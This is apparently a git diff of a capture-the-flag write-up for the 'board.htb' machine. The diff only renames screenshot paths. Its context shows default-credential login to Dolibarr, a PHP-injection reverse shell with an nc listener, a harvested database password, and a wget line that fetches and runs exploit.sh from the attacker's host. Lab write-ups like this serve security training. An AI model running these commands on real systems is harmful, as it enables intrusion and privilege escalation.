@@ -14,13 +14,13 @@ description: >-
 nmap 10.129.11.23 -sV -sC 
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Lets Check the Http server.&#x20;
 
 We can see the domain name in the front page :&#x20;
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 Lets update the Hosts File&#x20;
 
@@ -36,7 +36,7 @@ no usefull directories was found on board.htb with gobuster  so lets try to find
 ffuf -w /opt/useful/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://board.htb:80/ -H 'Host: FUZZ.board.htb' -mc 200 -fw 6243
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Initial Foothold
 
@@ -46,13 +46,13 @@ so lets add this vhost to our hosts file too .&#x20;
 echo "10.129.11.23 crm.board.htb" | sudo tee -a /etc/hosts
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 First things first lets try to enter the default credentials of the version 17.0.0 (admin/admin)
 
 we are in  :&#x20;
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>
 
 its time to look for an active CVE on this version.&#x20;
 
@@ -68,11 +68,11 @@ So in order to exploit it we have to create a new page and inject a php code. le
 nc -lnvp 4444
 ```
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>
 
 and then when we use the preview button of our new page we trigger the reverse shell :
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
 
 we are now www-data let see if we can find some usefull infos .
 
@@ -82,7 +82,7 @@ by looking on the official website we can see that dolibarr is using mysql so we
 find /var/www /home -type f -name "conf.php"
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
 we did found the password : serverfun2$2023!!
 
@@ -96,7 +96,7 @@ looking for suid who can be exploited for the privilege escalation we can see wi
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 we can find the following exploit  : [https://www.exploit-db.com/exploits/51180](https://www.exploit-db.com/exploits/51180)
 
@@ -147,4 +147,4 @@ lets upload it and try it :&#x20;
 wget 10.10.14.20:8000/exploit.sh && chmod 777 exploit.sh && ./exploit.sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
